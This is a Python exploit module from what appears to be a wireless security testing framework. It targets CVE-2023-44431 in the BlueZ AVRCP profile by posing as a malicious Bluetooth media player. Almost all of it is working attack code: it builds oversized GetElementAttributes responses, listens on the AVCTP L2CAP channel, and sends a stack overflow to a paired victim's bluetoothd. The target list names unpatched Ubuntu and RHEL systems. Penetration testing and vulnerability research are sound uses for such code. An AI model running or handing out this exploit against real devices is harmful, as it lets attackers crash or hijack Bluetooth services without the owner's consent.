# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """BlueZ AVRCP Stack Buffer Overflow (CVE-2023-44431).

    The BlueZ Bluetooth stack does not perform sufficient bounds
    checking when decoding attribute values in AVRCP (Audio/Video
    Remote Control Profile, UUID 0x110e) GetElementAttributes
    responses.  An attacker acting as a malicious media player can
    send an AVRCP response with attribute data that exceeds the
    stack-allocated decode buffer, overwriting saved registers and
    the return address.  This can lead to denial of service or,
    with a controlled payload, arbitrary code execution in the
    context of the bluetoothd process.

    Exploitation requires the victim to be paired and connected
    via an A2DP/AVRCP session to the attacker's device.

    CVSS v3.1: 7.1-8.0 (High), AV:A/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "BlueZ AVRCP Stack Buffer Overflow (CVE-2023-44431)",
        "description": (
            "Exploits CVE-2023-44431 via a stack buffer overflow in the BlueZ "
            "AVRCP profile handler.  The attacker emulates a media player that "
            "responds to GetElementAttributes requests with oversized attribute "
            "values, overflowing a stack buffer in bluetoothd and overwriting "
            "control flow data."
        ),
        "authors": (
            "IBM X-Force (analysis)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2023-44431",
            "https://www.ibm.com/support/pages/node/7185735",
            "https://github.com/bluez/bluez/security",
        ),
        "disclosure_date": "2024-05-03",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "BlueZ <= 5.70 (unpatched)",
            "Ubuntu 22.04/23.04 with vulnerable bluetoothd",
            "RHEL 8/9 with vulnerable bluetoothd",
        ),
    }

    target = OptIP("", "Target Bluetooth device address (BD_ADDR)")
    port = OptPort(23, "L2CAP PSM for AVCTP (default: 23 / 0x0017)")
    timeout = OptFloat(10.0, "Socket timeout in seconds")
    overflow_size = OptInteger(2048, "Stack overflow payload size beyond buffer limit (bytes)")
    interface = OptString("hci0", "Local Bluetooth adapter")

    # AVCTP / AVRCP protocol constants
    _AVCTP_PSM = 23
    _AVCTP_RESPONSE = 0x02
    _AVCTP_CR_RESPONSE = 0x01

    _AVC_CTYPE_STABLE = 0x0C
    _AVC_SUBUNIT_PANEL = 0x48
    _AVC_OPCODE_VENDOR = 0x00

    _AVRCP_PDU_GET_ELEMENT_ATTR = 0x20
    _AVRCP_PKT_TYPE_SINGLE = 0x00
    _AVRCP_COMPANY_BT_SIG = bytes([0x00, 0x19, 0x58])

    # AVRCP attribute IDs
    _ATTR_TITLE = 0x01
    _ATTR_ARTIST = 0x02
    _ATTR_ALBUM = 0x03
    _ATTR_TRACK_NUMBER = 0x04

    # Bluetooth L2CAP socket
    _BTPROTO_L2CAP = 0

    def _build_avrcp_response(self, pdu_id: int, params: bytes) -> bytes:
        """Build an AVRCP vendor-dependent response PDU."""
        avrcp_hdr = struct.pack(
            ">BBB3sB",
            self._AVC_CTYPE_STABLE,
            self._AVC_SUBUNIT_PANEL,
            self._AVC_OPCODE_VENDOR,
            self._AVRCP_COMPANY_BT_SIG,
            pdu_id,
        )
        pkt_type_param_len = struct.pack(">BH", self._AVRCP_PKT_TYPE_SINGLE, len(params))
        return avrcp_hdr + pkt_type_param_len + params

    def _build_oversized_attribute(self, attr_id: int, overflow_len: int) -> bytes:
        """Build a single AVRCP element attribute with oversized value.

        Attribute format:
          Attribute ID (4 BE) + Character Set (2 BE) + Value Length (2 BE) + Value
        """
        value = b"A" * overflow_len
        return struct.pack(">HIH", attr_id, 0x006A, len(value)) + value

    def _build_get_element_attr_response(self) -> bytes:
        """Build a GetElementAttributes response with oversized attributes.

        The total attribute values exceed the stack buffer allocated by
        BlueZ for decoding, causing the overflow.
        """
        attrs = b""
        attrs += self._build_oversized_attribute(self._ATTR_TITLE, self.overflow_size)
        attrs += self._build_oversized_attribute(self._ATTR_ARTIST, self.overflow_size // 2)

        num_attrs = struct.pack(">B", 2)
        params = num_attrs + attrs

        return self._build_avrcp_response(self._AVRCP_PDU_GET_ELEMENT_ATTR, params)

    def _build_avctp_packet(self, transaction_label: int, payload: bytes) -> bytes:
        """Wrap an AVRCP PDU inside an AVCTP packet header.

        AVCTP header: transaction_label (4 bits) | packet_type (2 bits) |
                      C/R (1 bit) | IPID (1 bit) + PID (2 BE)
        """
        first_byte = ((transaction_label & 0x0F) << 4) | (self._AVCTP_CR_RESPONSE << 1)
        pid = 0x110E  # AV/C
        hdr = struct.pack(">BH", first_byte, pid)
        return hdr + payload

    def _l2cap_send(self, sock: socket.socket, data: bytes) -> bool:
        try:
            sock.send(data)
            return True
        except OSError:
            return False

    def _bt_listen_l2cap(self) -> socket.socket | None:
        """Open a listening L2CAP socket on the AVCTP PSM."""
        try:
            sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, self._BTPROTO_L2CAP)
            sock.settimeout(self.timeout)
            sock.bind(("", self._AVCTP_PSM))
            sock.listen(1)
            return sock
        except OSError:
            return None

    def _bt_connect_l2cap(self) -> socket.socket | None:
        """Connect to target via L2CAP for reachability check."""
        try:
            sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, self._BTPROTO_L2CAP)
            sock.settimeout(self.timeout)
            target_addr = self.target if isinstance(self.target, str) else str(self.target)
            sock.connect((target_addr, self._AVCTP_PSM))
            return sock
        except (OSError, TimeoutError):
            return None

    @mute
    def check(self) -> bool:
        """Verify the target Bluetooth device is reachable via L2CAP AVCTP PSM."""
        sock = self._bt_connect_l2cap()
        if sock is None:
            return False
        sock.close()
        return True

    def run(self) -> None:
        if not self.target:
            print_error("target is required (Bluetooth device address)")
            return

        print_status(
            "Setting up malicious AVRCP media player and waiting for "
            "victim A2DP/AVRCP connection"
        )
        self._exploit()

    def _exploit(self) -> None:
        srv = self._bt_listen_l2cap()
        if srv is None:
            print_error(
                "Failed to open L2CAP listening socket on AVCTP PSM. "
                "Ensure Bluetooth adapter is available and you have root privileges."
            )
            return

        print_status(f"Listening on L2CAP PSM {self._AVCTP_PSM} (AVCTP)")
        print_status(f"Stack overflow payload: {self.overflow_size} bytes per attribute")
        print_info("Waiting for victim AVRCP connection...")

        try:
            client, addr = srv.accept()
        except (OSError, TimeoutError):
            print_error("No connection received within timeout")
            srv.close()
            return

        print_success(f"AVRCP connection from {addr[0]}")

        try:
            request = client.recv(4096)
            if not request or len(request) < 3:
                print_error("Received empty or malformed AVCTP packet")
                client.close()
                srv.close()
                return

            transaction_label = (request[0] >> 4) & 0x0F
            print_status(f"Received AVCTP request (TL={transaction_label})")

            avrcp_payload = self._build_get_element_attr_response()
            avctp_pkt = self._build_avctp_packet(transaction_label, avrcp_payload)

            print_status(
                f"Sending oversized GetElementAttributes response "
                f"({len(avctp_pkt)} bytes)"
            )
            self._l2cap_send(client, avctp_pkt)

            time.sleep(0.5)

            print_success(
                "Oversized AVRCP response delivered. "
                "If bluetoothd is vulnerable, the stack buffer has been "
                "overwritten. Monitor the target for crashes."
            )

        except OSError as e:
            print_error(f"Connection error during exploit: {e}")
        finally:
            client.close()
            srv.close()
